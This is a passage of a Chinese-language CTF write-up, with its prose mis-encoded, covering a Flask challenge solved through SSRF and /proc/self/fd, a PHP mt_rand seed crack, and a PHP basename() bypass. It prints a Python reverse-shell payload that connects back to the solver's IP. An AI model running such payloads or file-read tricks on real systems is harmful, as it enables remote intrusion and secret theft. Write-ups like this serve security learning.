SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>é€šè¿‡æ‰“å¼€<code>/tmp/secret.txt</code>æ–‡ä»¶ï¼Œç„¶åè¯»å–<code>SECRET_KEY</code>ï¼Œæœ€ååˆ æ‰è¯¥æ–‡ä»¶ã€‚</p> <p>å…³äºè¿™é¢˜ç›®çš„è€ƒç‚¹ï¼Œåœ¨<code>[V&amp;N2020 å…¬å¼€èµ›]CHECKIN</code>ä¸­å°±å·²ç»ç¢°åˆ°è¿‡äº†ï¼š<strong>åœ¨Linuxç³»ç»Ÿä¸‹ï¼Œå¦‚æœæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­çš„è¯ï¼Œå³ä½¿å°†æ–‡ä»¶åˆ é™¤ï¼Œä¹Ÿå¯ä»¥åœ¨<code>/proc/[pid]/fd/</code>è¿™ä¸ªç›®å½•ä¸‹çœ‹åˆ°è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚</strong></p> <p>ç»“åˆä¹‹å‰å­˜åœ¨çš„SSRFï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹ä¸Šé¢è¯´åˆ°çš„ç›®å½•ä¸­å­˜åœ¨çš„ç¬¦å·é“¾æ¥æ¥æŸ¥çœ‹<code>secret.txt</code>æ–‡ä»¶çš„å†…å®¹ï¼Œç”±äºä¸çŸ¥é“å½“å‰flaskåº”ç”¨çš„<code>pid</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>/proc/self/</code>æ¥ä»£æ›¿ï¼ˆè¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€äº›Linuxçš„çŸ¥è¯†ï¼Œå¯å‚è€ƒï¼š<a href="https://blog.csdn.net/psvoldemort/article/details/7322026" target="_blank" rel="noopener noreferrer">è¿™ç¯‡æ–‡ç« <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ï¼‰ï¼Œç”±äºLinuxä¸‹çš„æ–‡ä»¶æè¿°ç¬¦éƒ½æ˜¯éè´Ÿæ•´å½¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çˆ†ç ´ä¸€ä¸‹<code>/proc/self/fd/</code>ç›®å½•ä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003222236.png" alt="image-20201003222236479"></p> <p>åœ¨<code>/proc/self/fd/3</code>ä¸­å‘ç°äº†<code>SECRET_KEY</code>ï¼Œæ¥ç€ä¼ å…¥å‚æ•°ï¼Œå› ä¸ºæ‰§è¡Œçš„å‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ç›´æ¥åå¼¹ä¸€ä¸ªshellï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003222617.png" alt="image-20201003222617510"></p> <p>payloadå¦‚ä¸‹ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">302424f1</span><span class="token operator">-</span>e714<span class="token operator">-</span><span class="token number">44a6</span><span class="token operator">-</span>b67d<span class="token operator">-</span>a8d749c7e078<span class="token punctuation">.</span>node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>no_one_know_the_manager?key<span class="token operator">=</span>x6IdiBiuJg0dmEowLErZgcr8yAyt2Zp5oeY4XN0xQEQ<span class="token operator">=</span><span class="token operator">&amp;</span>shell<span class="token operator">=</span>python3 <span class="token operator">-</span>c <span class="token string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{Your_IP}',2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="header-anchor">#</a> å…¶ä»–</h2> <h3 id="æ¯ç‡¥çš„æŠ½å¥–"><a href="#æ¯ç‡¥çš„æŠ½å¥–" class="header-anchor">#</a> æ¯ç‡¥çš„æŠ½å¥–</h3> <p><strong>è€ƒç‚¹ï¼šPHPä¼ªéšæœºæ•°çˆ†ç ´</strong></p> <p>å…³äºéšæœºæ•°çš„å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/107302795" target="_blank" rel="noopener noreferrer">è¿™é‡Œ<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ï¼Œå·²ç»è®²çš„ç›¸å½“è¯¦ç»†äº†ã€‚</p> <p>è¿›å…¥é¢˜ç›®F12å‘ç°æç¤ºcheck.phpï¼Œä¸‹é¢æ˜¯æºç </p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>// check.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token shell-comment comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Content-Type: text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id='p1'&gt;&quot;</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;check.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>éšæœºæ•°çš„ç§å­æ˜¯0~999999999ä¹‹é—´çš„éšæœºæ•°ï¼Œéšæœºæ•°å–çš„æ˜¯0~å­—ç¬¦ä¸²str_long1çš„é•¿åº¦å€¼ï¼Œå¹¶ä¸”ç»™äº†ç”Ÿæˆå­—ç¬¦ä¸²çš„å‰10ä½ã€‚</p> <p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨ç»™å‡ºçš„å­—ç¬¦ä¸²å¾—åˆ°éšæœºæ•°ï¼Œå¹¶ä¸”è½¬æ¢æˆç¬¦åˆè§„åˆ™çš„æ•°æ®æ ¼å¼ï¼ŒEXPå¦‚ä¸‹ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>str1 <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2 <span class="token operator">=</span> <span class="token string">'Sd8QsWB02a'</span>
res <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>
            <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134210.png" alt="image-20200716134107085"></p> <p>å°†å¾—åˆ°çš„æ•°æ®æ”¾åˆ°å·¥å…·é‡Œå»çˆ†ç ´ï¼Œå¾—åˆ°ç§å­ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134253.png" alt="image-20200716134253815"></p> <p>æ ¹æ®ç§å­ç”Ÿæˆå­—ç¬¦ä¸²ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">681929264</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id='p1'&gt;&quot;</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134441.png" alt="image-20200716134441121"></p> <p><strong>è¿™é‡Œæœ‰ä¸ªå°å‘è¦æ³¨æ„ä¸€ä¸‹ï¼Œçˆ†ç ´å‡ºçš„ç§å­çš„PHPç‰ˆæœ¬æ˜¯7.1.0+ï¼Œå¿…é¡»ä½¿ç”¨ç¬¦åˆè¯¥ç‰ˆæœ¬çš„PHPç¯å¢ƒæ¥ç”Ÿæˆç›®æ ‡å­—ç¬¦ä¸²ï¼Œå¦åˆ™å°±ä¼šå¾—åˆ°é”™è¯¯ç»“æœã€‚</strong></p> <p>å°†å¾—åˆ°çš„ç»“æœè¾“å…¥å³å¯å¾—åˆ°flag</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134645.png" alt="image-20200716134644958" style="zoom:50%;"> <h3 id="can-you-guess-it"><a href="#can-you-guess-it" class="header-anchor">#</a> Can you guess it?</h3> <p><strong>è€ƒç‚¹ï¼šbasename()å‡½æ•°çš„æ¼æ´</strong></p> <p>basename()å‡½æ•°è¯¦æƒ…ï¼š<a href="https://www.w3school.com.cn/php/func_filesystem_basename.asp" target="_blank" rel="noopener noreferrer">W3school PHP basename() å‡½æ•°<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>ä¾‹å¦‚<code>index.php/a.php</code>ç»è¿‡basename()å¤„ç†ä¹‹åå°±ä¼šå¾—åˆ°<code>a.php</code>ï¼Œ<code>index.php/a.php/b.php</code>ç»è¿‡å¤„ç†ä¹‹åä¼šå¾—åˆ°<code>b.php</code>ï¼Œä½†æ˜¯basename()å‡½æ•°ä¼šå¿½ç•¥%81~%ffè¿™ç§è¶…è¿‡asciiç è¡¨èŒƒå›´çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´<code>index.php/a.php/%81</code>ç»è¿‡å¤„ç†ä¹‹åä»ç„¶æ˜¯<code>a.php</code>ã€‚</p> <p>æœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200721182639.png" alt="image-20200721182632625"></p> <p><strong>é¢˜è§£</strong>ï¼š</p> <p>é¢˜ç›®ä¸€å¼€å§‹å°±ç›´æ¥ç»™äº†æºç ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;I don't know what you are thinking, but I won't let you read it :)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Wrong.'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>If your guess is correct, I'll give you the flag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>?source<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter important">?&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$message</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index.php<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>guess<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span 